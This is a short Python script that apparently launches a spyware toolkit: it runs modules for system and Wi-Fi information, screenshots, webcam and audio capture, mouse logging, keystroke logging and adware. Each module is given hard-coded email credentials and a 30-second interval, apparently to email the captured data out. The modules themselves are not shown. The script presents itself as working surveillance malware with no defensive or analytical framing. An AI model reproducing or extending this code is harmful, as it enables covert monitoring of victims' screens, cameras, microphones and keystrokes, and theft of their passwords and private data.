try:
    import threading
    import system_info
    import tested_audio
    import tested_screenshot
    import tested_mouse
    import tested_key
    import tested_webcam
    import tested_adware
    import tested_wifi
except ModuleNotFoundError:
    exit(0)
finally:
    EMAIL_ADDRESS = "eef5687d144f58"
    EMAIL_PASSWORD = "59d3054644d98a"
    SEND_REPORT_EVERY = 30

    print("Send System")
    SystemInfo = system_info.system_info(EMAIL_ADDRESS, EMAIL_PASSWORD)
    SystemInfo.run()

    print("Send Wifi")
    WifiInfo = tested_wifi.wifi(EMAIL_ADDRESS, EMAIL_PASSWORD)
    WifiInfo.run()

    print("Send Screen")
    Screenlogger = tested_screenshot.screen_logger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Screenlogger.run()

    print("Send Cam")
    WebCam = tested_webcam.webcam(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    WebCam.run()

    print("Send Audio")
    Audiologger = tested_audio.AudioLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Audiologger.run()

    print("Send Mouse")
    Mouselogger = tested_mouse.MouseLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    Mouselogger.run()

    print("Send Key")
    keylogger = tested_key.KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()

    print("Adware")
    Adware = tested_adware.adware(SEND_REPORT_EVERY)
    Adware.run()

    

    
